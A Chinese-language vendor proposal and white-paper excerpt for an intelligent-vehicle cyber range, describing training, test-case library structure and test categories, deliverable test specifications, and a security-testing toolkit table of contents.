培训认证、CISP-PTS培训认证，CISP-PTE（注册信息安全专业人员渗透测试工程师），提升XXXX相关人员网络安全能力；CISP-PTS（注册信息安全专业人员渗透测试专家）提升相关人员的安全测试及漏洞挖掘能力。</p><p>通过供应商的人才培养方案，可使XXXX相关人员掌握安全运营、渗透测试、应急响应等相关知识及流程。</p><p>安全运营：</p><p>1.资产管理；</p><p>2.安全态势监控；</p><p>3.安全事件分析、处置与溯源；</p><p>4.安全运营计划制定；</p><p>5.网络安全管理制度的编制、审核等。</p><p>渗透测试内容：</p><p>1.明确目标、收集信息，编写渗透测试方案；</p><p>2.漏洞探测、信息分析、夺取靶机；</p><p>3.信息整理、提交渗透测试报告。</p><p>应急工作内容应急事件分析、应急事件处置。</p><p>安全服务内容安全风险评估、漏洞扫描与验证、威胁分析等。</p><h1 id="智能汽车网络靶场测试用例库"><a href="#智能汽车网络靶场测试用例库" class="headerlink" title="智能汽车网络靶场测试用例库"></a>智能汽车网络靶场测试用例库</h1><h2 id="总体概述-1"><a href="#总体概述-1" class="headerlink" title="总体概述"></a>总体概述</h2><p>随着“新四化”的不断推进，汽车原本几千上万数量的机械零部件，逐步被电机电控、动力电池、整车控制器等在内的电子电气系统取代。同时新的业务场景催生出例如汽车TBOX，数字车钥匙等在内的具备通信功能的电子电气部件，这又衍生出了一系列新的网络安全隐患。2020年国内外围绕汽车网络安全的标准已全面铺开，总体上呈现出以自动驾驶、V2X等应用场景为目标抓手，指导汽车产业链在概念、开发、生产、运维等阶段开展网络安全活动。2019年开始，不少车企与互联网公司牵手，以战略合作和共建实验室等方式携手合作共同解决网络安全问题，这意味着“新四化”的变革已经冲出了汽车领域，朝着横向和多元的发展空间并进。</p><p>然而近年来不断频发的汽车信息安全召回事件也引发行业的高度关注，随着车辆智能化、网联化程度不断提高。作为公共交通系统的重要组成部分，汽车被黑客控制之后，不仅可能会带来驾驶者个人的信息和隐私的泄露，还可能会直接带来人身和财产伤害和损失，甚至直接影响公共安全。智能网联汽车的信息安全问题已然成为车厂和相关安全标准部门需迫切解决的问题。为了尽可能多的发现车辆潜在的信息安全漏洞，并及时对漏洞进行修复，加强车辆信息安全，需要进行基于靶场的信息安全渗透测试。</p><p>基于靶场的信息安全渗透测试的依据即是用例库，XXXX智能汽车网络靶场用例库包含：零部件用例库及整车用例库。</p><h2 id="测试用例开发"><a href="#测试用例开发" class="headerlink" title="测试用例开发"></a>测试用例开发</h2><p>概述测试用例根据审核后的测试策略设计，每一测试用例名称代表一个测试点并且拥有唯一ID。通过使用测试ID有利于测试活动的可追溯性，便于测试管理。每一测试用例用文字详细描述本测试的目的和整个过程，测试用例是word或Excel格式，主要包括以下方面内容：</p><p>测试用例 ID</p><p>测试用例名称</p><p>测试目的</p><p>初始条件</p><p>测试工具</p><p>参考标准</p><p>用例来源</p><p>测试步骤</p><p>评价方法</p><p>漏洞危害</p><p>修复建议</p><h2 id="测试策略及测试规范开发方案"><a href="#测试策略及测试规范开发方案" class="headerlink" title="测试策略及测试规范开发方案"></a>测试策略及测试规范开发方案</h2><p>我司具备2款车型的整车信息安全测试规范开发经验。</p><p>我司提供以往项目中完成的测试策略和测试规范开发示例，示例包括零部件信息安全和整车信息安全测试用例及测试规范，如下所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/86a68e53589dcaaee716da6bd7456adf.png" alt="1694345295068"></p><p>整车测试用例及测试规范示例</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/88a46a57919ab14d6c1312c25f3fd3d3.png" alt="1694345660317"></p><p>零部件测试用例及测试规范示例</p><p>同时，我司提供一套以往项目中使用的测试计划、测试策略和测试规范相关交付物模板。</p><table><thead><tr><th>整车信息安全测试</th><th></th><th></th></tr></thead><tbody><tr><td>测试内容</td><td>完成GB 汽车整车信息安全技术要求 相关测试要求</td><td></td></tr><tr><td>入库时间</td><td>*年*月*日</td><td></td></tr><tr><td>责任部门</td><td>信息安全部</td><td></td></tr><tr><td>责任人</td><td>张三</td><td></td></tr><tr><td>测试计划</td><td>开始时间</td><td>结束时间</td></tr><tr><td></td><td>*年*月*日</td><td>*年*月*日</td></tr><tr><td>测试策略</td><td>因车企项目测试中，本项目先测试有线网络部分</td><td></td></tr><tr><td>测试规范</td><td>参照GB 汽车整车信息安全技术要求 及 测试系统技术要求进行测试</td><td></td></tr><tr><td>测试记录</td><td></td><td></td></tr></tbody></table><p>为确保本项目顺利开展，我司若中标，将针对基于靶场的测试系统进行分析，制定测试策略，并交付测试策略文档，经客户审核确认后，进行测试规范开发。</p><p>在项目前期根据测试策略将信息安全和数据安全单控制器及系统目标合理划分为不同的测试用例，最终形成测试规范。</p><p>我司提交的所有测试用例包括测试ID、测试用例名称、测试目的、初始条件、操作步骤、评价方法、漏洞危害、修复建议、测试属性（测试环境、测试方法等）等内容，参照客户相关模板进行定制。</p><p>测试用例全覆盖GB《整车信息安全技术要求》、WP.29 R155、《电动汽车远程服务与管理系统信息安全技术要求及试验方法》、《车载信息交互系统信息安全技术要求及试验方法》、《汽车网关信息安全技术要求及试验方法》、《汽车软件升级通用技术要求》等，并结合甲方原有的测试用例库进行深度定制。</p><p>我司提供的测试用例数量及复杂程度在覆盖全部测试需求的基础上，数量达到2300条以上，复杂程度达到测试人员易懂可操作。</p><h2 id="用例库-1"><a href="#用例库-1" class="headerlink" title="用例库"></a>用例库</h2><h3 id="零部件和集成测试用例库方案"><a href="#零部件和集成测试用例库方案" class="headerlink" title="零部件和集成测试用例库方案"></a>零部件和集成测试用例库方案</h3><ol><li>确定测试目标</li></ol><p>明确测试的目标和范围。确定要测试的零部件和系统，以及测试的关键功能和性能指标。这有助于确定测试用例的重点和覆盖范围。</p><ol><li>收集需求和规范</li></ol><p>收集相关的需求文档、规范和设计文档。了解零部件和系统的功能要求、性能要求和接口要求等。这些文档将成为编写测试用例的重要参考。</p><ol><li>制定测试策略</li></ol><p>制定零部件和集成测试的策略和计划。确定测试的级别（单元测试、集成测试、系统测试等），以及测试的方法和技术。考虑使用自动化测试工具和框架来提高效率和一致性。</p><ol><li>编写测试用例</li></ol><p>根据需求和规范，编写详细的测试用例。测试用例应该覆盖不同的功能场景、输入条件和边界条件。确保测试用例具有清晰的预期结果和验证步骤。</p><p>测试用例包括如下：</p><p>常规检测：含电路板的焊接触点和各接口（JTAG、UART及其他敏感测试接口）等检测；芯片安全检测等；存储固件检测，敏感存储及各系统固件等检测；总线检测，总线网关机制检测和总线接口安全防护措施检测；I/O安全检测，端口访问策略及安全防护措施检测。</p><p>硬件安全检测：硬件参数功能单元信息泄露；硬件调试接口是否在量产后保留；调试接口安全防护；eSIM卡接口安全；4G模组固件提取；USB接口安全防护；存储器内容提取。</p><p>固件安全检测：固件算法分析检测；密钥硬编码检测；服务接口访问安全；隐藏后门；敏感数据；配置文件安全；固件提取分析，逆向，篡改后再次刷写；固件加固安全。</p><p>系统安全检测：Root检测，Root防御、系统修复、系统防篡改等检测；系统启动安全检测，安全启动；Bootloader防篡改检测；系统漏洞检测等；权限等级设置检查；内存隔离安全性测试；应用授权管理安全性测试；系统服务安全性测试。</p><p>数据存储安全检测：数据加密存储检查，如配置参数、日志数据等敏感信息加密存储；数据完整性检测；敏感数据访问控制检测；数据存取错误反馈检测，密钥管理检测，敏感数据残留检测等。</p><p>对外通信接口检测：网络通道，防火墙检测；USB端口，USB刷新软件安全策略检测，防伪造软件升级；UART调试端口刷新软件安全策略检测；接口模糊测试。</p><p>调试端口检测：JTAG刷新软件安全策略检测，防伪造软件升级；SPI/UART刷新软件安全策略检测；UART刷新软件安全策略检测。</p><p>车内通信安全检测：与CAN上车内控制单元的安全策略检测；与其他ECU通信的安全策略检测。</p><p>日志检测：应用程序日志内容检测。</p><p>蓝牙检测：经典蓝牙已知漏洞POC检测；配对机制校验；指令合法性校验；弱密码检测；敏感数据嗅探；低功耗蓝牙协议栈漏洞测试；通信数据重放；通信数据明文测试；通信数据加密传输安全性测试；BLE鉴权密钥破解；配对模式安全性测试；BD_ADDR防读取测试；通信连接占用测试；控车身份伪冒测试。</p><p>WiFi检测：无线Wi-Fi认证安全测试；无线Wi-Fi驱动安全性分析；无线Wi-Fi通信安全测试；无线Wi-Fi拒绝服务攻击测试。</p><p>业务安全检测：转发策略检测；错误帧网关隔离记录。</p><p>域控制器权限控制安全检测：总线访问权限、设备接入权限检测。</p><ol><li>组织测试用例库：将编写的测试用例组织成一个结构化的测试用例库，数量2000余条。可以按照模块、功能、优先级等进行分类和组织。确保测试用例库易于管理和维护，并具有良好的可搜索性和可复用性。</li><li>执行测试用例</li></ol><p>根据测试计划和策略，执行测试用例。记录测试结果、问题和缺陷。使用合适的测试工具和设备进行测试，确保测试环境的准备和配置。</p><ol><li>分析和改进</li></ol><p>分析测试结果和问题，识别潜在的缺陷和改进点。根据测试结果进行调整和改进测试用例和测试策略。持续改进测试用例库，以提高测试效率和质量。</p><ol><li>集成测试用例库</li></ol><p>将零部件和集成测试用例库与其他测试用例库进行集成。确保不同级别的测试用例可以相互补充和覆盖，以实现全面的测试覆盖。</p><ol><li>持续维护和更新</li></ol><p>随着零部件和系统的演进和变化，持续维护和更新测试用例库。跟踪需求和规范的变化，及时更新测试用例以适应新的功能和变更。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c6f3ef163dd318b82b4fd680a6588b84.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b2c9061e54ad1a56a6fd8caec9cddddf.png"></p><ol><li>零部件和集成测试用例库功能参数</li><li>包含常规检测，包含电路板的焊接触点和各接口（JTAG、UART及其他敏感测试接口）等检测；芯片安全检测等；存储固件检测，敏感存储及各系统固件等检测；总线检测，总线网关机制检测和总线接口安全防护措施检测；I/O安全检测，端口访问策略及安全防护措施检测；</li><li>包含硬件安全检测，包含硬件参数功能单元信息泄露；硬件调试接口是否在量产后保留；调试接口安全防护；eSIM卡接口安全；4G模组固件提取；USB接口安全防护；存储器内容提取；</li><li>包含固件安全检测，包含固件算法分析检测；密钥硬编码检测；服务接口访问安全；隐藏后门；敏感数据；配置文件安全；固件提取分析，逆向，篡改后再次刷写；固件加固安全；</li><li>包含系统安全检测，包含Root检测，Root防御、系统修复、系统防篡改等检测；系统启动安全检测，安全启动；Bootloader防篡改检测；系统漏洞检测等；权限等级设置检查；内存隔离安全性测试；应用授权管理安全性测试；系统服务安全性测试；</li><li>包含数据存储安全检测，包含数据加密存储检查，如配置参数、日志数据等敏感信息加密存储；数据完整性检测；敏感数据访问控制检测；数据存取错误反馈检测，密钥管理检测，敏感数据残留检测等；</li><li>包含对外通信接口检测，包含网络通道，防火墙检测；USB端口，USB刷新软件安全策略检测，防伪造软件升级；UART调试端口刷新软件安全策略检测；接口模糊测试；</li><li>包含调试端口检测，包含JTAG刷新软件安全策略检测，防伪造软件升级；SPI/UART刷新软件安全策略检测；UART刷新软件安全策略检测；</li><li>包含车内通信安全检测，包含与CAN上车内控制单元的安全策略检测；与其他ECU通信的安全策略检测；</li><li>包含日志检测，包含应用程序日志内容检测；</li><li>包含蓝牙检测，包含经典蓝牙已知漏洞POC检测；配对机制校验；指令合法性校验；弱密码检测；敏感数据嗅探；低功耗蓝牙协议栈漏洞测试；通信数据重放；通信数据明文测试；通信数据加密传输安全性测试；BLE鉴权密钥破解；配对模式安全性测试；BD_ADDR防读取测试；通信连接占用测试；控车身份伪冒测试；</li><li>包含WiFi检测，包含无线Wi-Fi认证安全测试；无线Wi-Fi驱动安全性分析；无线Wi-Fi通信安全测试；无线Wi-Fi拒绝服务攻击测试；</li><li>包含业务安全检测，包含转发策略检测；错误帧网关隔离记录；</li><li>包含域控制器权限控制安全检测，包含总线访问权限、设备接入权限检测；</li><li>提供的零部件用例数量2000余条。</li></ol><h3 id="整车用例库方案"><a href="#整车用例库方案" class="headerlink" title="整车用例库方案"></a>整车用例库方案</h3><ol><li>确定测试目标</li></ol><p>明确整车信息安全测试的目标和范围。确定要测试的信息安全功能和机制，例如身份验证、数据加密、通信安全等。了解整车系统的信息安全需求和规范，以确定测试的重点和覆盖范围。</p><ol><li>收集安全需求和规范</li></ol><p>收集整车系统的安全需求文档、规范和设计文档。了解整车系统的安全功能要求、安全机制和安全标准等。这些文档将成为编写测试用例的重要参考。</p><ol><li>制定测试策略</li></ol><p>制定整车信息安全测试的策略和计划。确定测试的级别（系统级安全测试、网络通信安全测试等），以及测试的方法和技术。考虑使用安全评估工具和技术来发现潜在的安全漏洞和风险。</p><p>测试用例包括如下：</p><p>整车架构安全用例：数据安全、系统安全、车内通信安全、USB接口安全、车载以太网安全、APP应用信息安全、整车无线电信息安全、云平台信息安全、整车业务系统安全用例。</p><p>整车数据安全用例：应用配置文件安全；数据库安全；日志输出安全；运行时数据安全；关键密钥安全；硬件安全芯片及密码管理模块；一机一密检测；访问权限控制测试；用户隐私信息存储安全性验证；内存敏感信息泄露；本地数据安全存储；数据完整性测试。</p><p>整车系统安全用例：服务端口暴露；服务未授权访问；服务命令执行；已知漏洞扫描；账户破解；权限提升；系统防火墙策略及防火墙安全性测试；安全启动安全性测试；Linux系统内核功能单元篡改；内存隔离安全性测试；应用授权管理安全性测试；系统服务安全性测试。</p><p>整车车内通信安全用例：车载CAN总线抗DoS测试；CAN报文抗重放测试；CAN总线模糊测试；诊断访问信息安全测试；诊断数据包防御信息安全测试；诊断模糊测试；诊断复位测试；诊断读写服务测试；诊断动作指令测试；诊断通讯控制服务测试。</p><p>整车USB接口安全用例：调试功能分析；固件更新逻辑分析；恶意木马导入。</p><p>整车车载以太网安全用例：车载以太网服务探测测试；车载以太网服务认证测试；车载以太网重放攻击测试；车载以太网未授权接入；车载以太网模糊测试；车载以太网端口扫描。</p><p>整车APP应用信息安全用例：APP安装包签名校验；APP代码安全；APP加固安全；密钥与证书安全；日志安全；隐私、敏感信息安全； APP应用登入业务逻辑；APP应用注册安全；APP通信保密检测。</p><p>整车无线电信息安全用例：蜂窝网络数据篡改仿冒、敏感数据分析、拒绝服务攻击测试、加密传输测试、双向身份认证测试；WiFi中间人攻击、协议脆弱性分析、已知漏洞POC、弱密码检测、广播监听；GPS干扰、欺骗；射频重放攻击、低频中继攻击；TPMS抗干扰、抗重放、加密防篡改测试。</p><p>整车云平台信息安全用例至少包含配置管理测试、域名测试、开放端口测试、架构安全、组件安全、上传缺陷、基础结构和应用管理接口安全、基础配置管理缺陷、常见业务逻辑缺陷、限制功能前端绕过、用户认证缺陷、资源访问、权限检测、会话缺陷、参数值篡改、多参数验证、注入攻击、客户端攻击用例；</p><p>整车业务系统信息安全用例：远程控车业务车端、手机端、云端业务逻辑安全、云端服务安全、远程控车应用安全等；PKI系统证书签发、身份认证、权限检测、认证管理、策略控制、证书注册中心、密钥管理中心安全等；远程升级固件包安全、升级流程、通信安全、身份认证、证书签发、API接口、云端服务安全等；数字钥匙车端、手机端、云端业务逻辑安全、云端服务安全、数字钥匙代码安全等；摄像头硬件、存储、总线、接口、通信、启动及业务逻辑安全等；自动泊车硬件、存储、总线、接口、通信、启动及业务逻辑安全等；远程诊断通信、应用、业务逻辑安全等；自动驾驶访问点及传感器安全、视频流、总线通信安全、固件安全等用例。</p><ol><li>确定安全测试场景</li></ol><p>基于安全需求和规范，确定整车信息安全测试的关键场景和使用情境。考虑不同的攻击场景、威胁模型和安全漏洞类型等。确保测试场景具有多样性和代表性，能够覆盖整车系统的信息安全方面。</p><ol><li>编写安全测试用例</li></ol><p>根据安全需求和规范，编写详细的整车信息安全测试用例，用例数量300余条。测试用例应该覆盖不同的安全场景、攻击方式和安全措施。确保测试用例具有清晰的预期结果和验证步骤。</p><ol><li>组织测试用例库</li></ol><p>将编写的整车信息安全测试用例组织成一个结构化的测试用例库。可以按照安全功能、攻击类型、安全场景等进行分类和组织。确保测试用例库易于管理和维护，并具有良好的可搜索性和可复用性。</p><ol><li>执行安全测试用例</li></ol><p>根据安全测试计划和策略，执行整车信息安全测试用例。使用合适的安全评估工具和技术进行测试，发现潜在的安全漏洞和风险。记录测试结果、问题和缺陷。</p><ol><li>分析和改进</li></ol><p>分析整车信息安全测试结果和问题，识别潜在的安全漏洞和改进点。根据测试结果进行调整和改进测试用例和测试策略。持续改进整车信息安全测试用例库，以提高测试效率和安全性。</p><ol><li>持续维护和更新</li></ol><p>随着整车系统的演进和变化，持续维护和更新安全测试用例库。跟踪安全需求和规范的变化，及时更新测试用例以适应新的安全威胁和风险。</p><ol><li>产品彩页</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0c8e57cb18947db282806ac485a6b372.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/15096ba753bf7fdf11785d191cc9f35d.png"></p><ol><li>整车用例库方案功能参数</li><li>包含整车架构安全用例，包含数据安全、系统安全、车内通信安全、USB接口安全、车载以太网安全、APP应用信息安全、整车无线电信息安全、云平台信息安全、整车业务系统安全用例；</li><li>整车数据安全用例包含应用配置文件安全；数据库安全；日志输出安全；运行时数据安全；关键密钥安全；硬件安全芯片及密码管理模块；一机一密检测；访问权限控制测试；用户隐私信息存储安全性验证；内存敏感信息泄露；本地数据安全存储；数据完整性测试；</li><li>整车系统安全用例包含服务端口暴露；服务未授权访问；服务命令执行；已知漏洞扫描；账户破解；权限提升；系统防火墙策略及防火墙安全性测试；安全启动安全性测试；Linux系统内核功能单元篡改；内存隔离安全性测试；应用授权管理安全性测试；系统服务安全性测试；</li><li>整车车内通信安全用例包含车载CAN总线抗DoS测试；CAN报文抗重放测试；CAN总线模糊测试；诊断访问信息安全测试；诊断数据包防御信息安全测试；诊断模糊测试；诊断复位测试；诊断读写服务测试；诊断动作指令测试；诊断通讯控制服务测试；</li><li>整车USB接口安全用例包含调试功能分析；固件更新逻辑分析；恶意木马导入；</li><li>整车车载以太网安全用例包含车载以太网服务探测测试；车载以太网服务认证测试；车载以太网重放攻击测试；车载以太网未授权接入；车载以太网模糊测试；车载以太网端口扫描；</li><li>整车APP应用信息安全用例包含APP安装包签名校验；APP代码安全；APP加固安全；密钥与证书安全；日志安全；隐私、敏感信息安全； APP应用登入业务逻辑；APP应用注册安全；APP通信保密检测；</li><li>整车无线电信息安全用例包含蜂窝网络数据篡改仿冒、敏感数据分析、拒绝服务攻击测试、加密传输测试、双向身份认证测试；WiFi中间人攻击、协议脆弱性分析、已知漏洞POC、弱密码检测、广播监听；GPS干扰、欺骗；射频重放攻击、低频中继攻击；TPMS抗干扰、抗重放、加密防篡改测试；</li><li>整车云平台信息安全用例包含配置管理测试、域名测试、开放端口测试、架构安全、组件安全、上传缺陷、基础结构和应用管理接口安全、基础配置管理缺陷、常见业务逻辑缺陷、限制功能前端绕过、用户认证缺陷、资源访问、权限检测、会话缺陷、参数值篡改、多参数验证、注入攻击、客户端攻击用例；</li><li>整车业务系统信息安全用例包含远程控车业务车端、手机端、云端业务逻辑安全、云端服务安全、远程控车应用安全等；PKI系统证书签发、身份认证、权限检测、认证管理、策略控制、证书注册中心、密钥管理中心安全等；远程升级固件包安全、升级流程、通信安全、身份认证、证书签发、API接口、云端服务安全等；数字钥匙车端、手机端、云端业务逻辑安全、云端服务安全、数字钥匙代码安全等；摄像头硬件、存储、总线、接口、通信、启动及业务逻辑安全等；自动泊车硬件、存储、总线、接口、通信、启动及业务逻辑安全等；远程诊断通信、应用、业务逻辑安全等；自动驾驶访问点及传感器安全、视频流、总线通信安全、固件安全等用例；</li><li>提供的整车用例300余条。用例截图证明如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/88c80ba7f3578a9ae60ea282b022d0c2.png"></p><h2 id="测试策略及测试规范开发交付物"><a href="#测试策略及测试规范开发交付物" class="headerlink" title="测试策略及测试规范开发交付物"></a>测试策略及测试规范开发交付物</h2><p>我司根据及甲方要求，提供测试内容及交付物，如下表：</p><table><thead><tr><th><strong>类别</strong></th><th><strong>测试内容</strong></th><th><strong>数量（份）</strong></th><th><strong>交付形式</strong></th></tr></thead><tbody><tr><td>零部件安全</td><td>车辆控制器硬件安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>Linux系统信息安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>Android系统信息安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>QNX系统信息安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>控制器边界和传输安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>安全启动测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>敏感信息安全规范</td><td>1</td><td>电子</td></tr><tr><td>通信安全</td><td>CAN通信安全测试规范规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>以太网安全测试规范规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>经典蓝牙安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>低功耗蓝牙安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>WIFI安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>GPS安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>NFC安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>车云通信安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>APP安全</td><td>车机APP安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>手机APP/TSP安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>WEB安全</td><td>WEB安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>软件升级安全</td><td>远程升级安全测试（OTA）规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>本地升级安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>升级包安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>业务安全</td><td>数字钥匙安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>整车安全</td><td>整车信息安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>安全功能</td><td>CAN SecOC测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>以太网SecOC测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>CAN IDS测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>终端系统IDS测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>以太网IDS测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>数字证书申请测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>OBD接口安全测试规范</td><td>1</td><td>电子</td></tr><tr><td></td><td>V2X安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>数据安全</td><td>数据安全测试规范</td><td>1</td><td>电子</td></tr><tr><td>密码安全</td><td>密码检测规范</td><td>1</td><td>电子</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="posts/0/"/>
      <url>posts/0/</url>
      
        <content type="html"><![CDATA[<p><strong>国利网安智能汽车网络靶场工具库</strong></p><p><strong>技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7fff6fc96b751b4ab487f682d0a3a2c2.png"></p><p>浙江国利网安科技有限公司</p><p>目 录</p><p>1 智能汽车网络靶场工具库-密码检测工具 1</p><p>1.1 总体概述 1</p><p>1.2 智能汽车网络靶场密码检测测试工具 2</p><p>1.2.1 商用密码应用安全性检测平台 3</p><p>1.2.2 网络传输密码检测仪 27</p><p>1.2.3 智能网联V2X密码应用安全检测工具 31</p><p>1.2.4 密码应用漏洞扫描系统 34</p><p>2 智能汽车网络靶场工具库-V2X安全检测平台 38</p><p>2.1 总体概述 38</p><p>2.2 V2X安全检测平台方案 39</p><p>2.2.1 测试控制系统 39</p><p>2.2.2 测试环境基础平台 42</p><p>2.2.3 测试模拟系统 48</p><p>2.2.4 测试系统管理模块 53</p><p>2.2.5 测试系统执行模块 53</p><p>2.2.6 测试系统报告生成模块 53</p><p>2.2.7 V2X安全演示功能 54</p><p>2.2.8 测试用例和软件实现——V2X安全验证测试用例及对应软件实现（含源码） 54</p><p>2.2.9 V2X安全检测平台 62</p><p>3 智能汽车网络靶场工具库-业务安全测试工具 66</p><p>3.1 总体概述 66</p><p>3.2 蓝牙安全测试工具 66</p><p>3.2.1 工具概述 66</p><p>3.2.2 工具方案 66</p><p>3.2.3 产品彩页 68</p><p>3.2.4 工具参数 69</p><p>3.3 蓝牙协议分析工具 71</p><p>3.3.1 工具概述 71</p><p>3.3.2 工具方案 71</p><p>3.3.3 产品彩页 72</p><p>3.3.4 工具参数 72</p><p>3.3.5 蓝牙BLE检测工具 73</p><p>3.3.6 WIFI安全测试工具 76</p><p>3.3.7 射频钥匙安全测试工具 81</p><p>3.3.8 NFC安全检测工具 85</p><p>3.3.9 OTA测试工具 88</p><p>3.3.10 车辆信号模拟仿真软件 92</p><p>3.3.11 车载网络安全测试工具 94</p><p>3.3.12 诊断需求定义工具 102</p><p>4 智能汽车网络靶场工具库-数据安全测试工具 105</p><p>4.1 总体概述 105</p><p>4.2 车端数据安全测试工具 105</p><p>4.2.1 工具概述 105</p><p>4.2.2 工具方案 105</p><p>4.2.3 产品彩页 107</p><p>4.2.4 工具参数 107</p><p>4.3 APP隐私合规测试工具 109</p><p>4.3.1 工具概述 109</p><p>4.3.2 工具方案 109</p><p>4.3.3 产品彩页 112</p><p>4.3.4 工具参数 113</p><p>4.4 云端数据检查工具 115</p><p>4.4.1 工具概述 115</p><p>4.4.2 工具方案 116</p><p>4.4.3 产品彩页 120</p><p>4.4.4 工具参数 121</p><p>5 智能汽车网络靶场工具库-系统安全测试工具 123</p><p>5.1 总体概述 123</p><p>5.2 模糊测试工具 124</p><p>5.2.1 工具概述 124</p><p>5.2.2 工具方案 124</p><p>5.2.3 产品彩页 127</p><p>5.2.4 工具参数 127</p><p>5.3 APP自动化检测工具 130</p><p>5.3.1 工具概述 130</p><p>5.3.2 工具方案 131</p><p>5.3.3 产品彩页 133</p><p>5.3.4 工具参数 134</p><p>5.4 APP加固工具 137</p><p>5.4.1 工具概述 137</p><p>5.4.2 工具方案 137</p><p>5.4.3 产品彩页 140</p><p>5.4.4 工具参数 142</p><p>5.5 Android应用程序反编译工具 145</p><p>5.5.1 工具概述 145</p><p>5.5.2 工具方案 145</p><p>5.5.3 产品彩页 147</p><p>5.5.4 工具参数 147</p><p>5.6 系统漏洞扫描工具 159</p><p>5.6.1 工具概述 159</p><p>5.6.2 工具方案 159</p><p>5.6.3 产品彩页 162</p><p>5.6.4 工具参数 163</p><p>5.7 Web安全扫描工具 165</p><p>5.7.1 工具概述 165</p><p>5.7.2 工具方案 165</p><p>5.7.3 产品彩页 167</p><p>5.7.4 工具参数 167</p><p>5.8 集成渗透测试工具 168</p><p>5.8.1 工具概述 168</p><p>5.8.2 工具方案 168</p><p>5.8.3 产品白皮书 170</p><p>5.8.4 工具参数 176</p><p>5.9 漏洞利用工具 177</p><p>5.9.1 工具概述 177</p><p>5.9.2 工具方案 177</p><p>5.9.3 产品彩页 179</p><p>5.9.4 工具参数 179</p><p>5.10 源代码安全审计工具 180</p><p>5.10.1 工具概述 180</p><p>5.10.2 工具方案 180</p><p>5.10.3 产品彩页 183</p><p>5.10.4 工具参数 184</p><p>5.11 开源组件检查工具 186</p><p>5.11.1 工具概述 186</p><p>5.11.2 工具方案 186</p><p>5.11.3 产品彩页 188</p><p>5.11.4 工具参数 189</p><p>5.12 二进制反汇编工具 192</p><p>5.12.1 工具概述 192</p><p>5.12.2 工具方案 192</p><p>5.12.3 产品彩页 195</p><p>5.12.4 工具参数 199</p><p>5.13 二进制分析工具 203</p><p>5.13.1 工具概述 203</p><p>5.13.2 工具方案 203</p><p>5.13.3 产品彩页 206</p><p>5.13.4 工具参数 207</p><p>5.14 Web漏洞扫描工具 209</p><p>5.14.1 工具概述 209</p><p>5.14.2 工具方案 209</p><p>5.14.3 产品彩页 213</p><p>5.14.4 工具参数 219</p><p>6 智能汽车网络靶场工具库-硬件工具 229</p><p>6.1 总体概述 229</p><p>6.2 硬件安全测试工具集 229</p><p>6.2.1 工具概述 229</p><p>6.2.2 工具方案 230</p><p>6.3 USB测试工具集 247</p><p>6.3.1 工具概述 247</p><p>6.3.2 工具方案 247</p><p>6.4 车载以太网转换工具 249</p><p>6.4.1 工具概述 249</p><p>6.4.2 工具方案及参数 250</p><p>6.5 设备清单 250</p><h1 id="智能汽车网络靶场工具库-密码检测工具"><a href="#智能汽车网络靶场工具库-密码检测工具" class="headerlink" title="智能汽车网络靶场工具库-密码检测工具"></a>智能汽车网络靶场工具库-密码检测工具</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>随着新一代信息技术的不断发展，由海量数据、异构网络、复杂应用组成的网络空间，已成为各国争相抢夺的新阵地、新战场。以网络安全为代表的非传统安全威胁持续蔓延，使得网络空间安全风险叠加倍增，威胁挑战日益严峻，安全形势不容乐观。密码是保障网络安全的核心技术，是构建网络信任的基石。利用密码在安全认证、加密保护、信任传递等方面的重要作用，能够有效地消除或控制潜在的“安全风险”，实现从被动防御向主动免疫的战略转变。</p><p>国外高度重视密码工作，以密码产业化为基础不断增强应用，提升网络空间安全综合保障能力。各国围绕密码技术积极推动密码产业化应用，以密码为基础加强网络安全保障体系建设，特别是利用密码在数据保护、安全接入、信任体系建设等方面的作用，不断强化网络安全保障体系的机密性，带动密码和网络安全产业做大做强。</p><p>美国国家标准与技术研究院、欧洲电信标准化协会一直积极抢占密码理论研究和算法前沿高地，形成算法、协议、接口、应用相互促进、互相衔接的技术体系 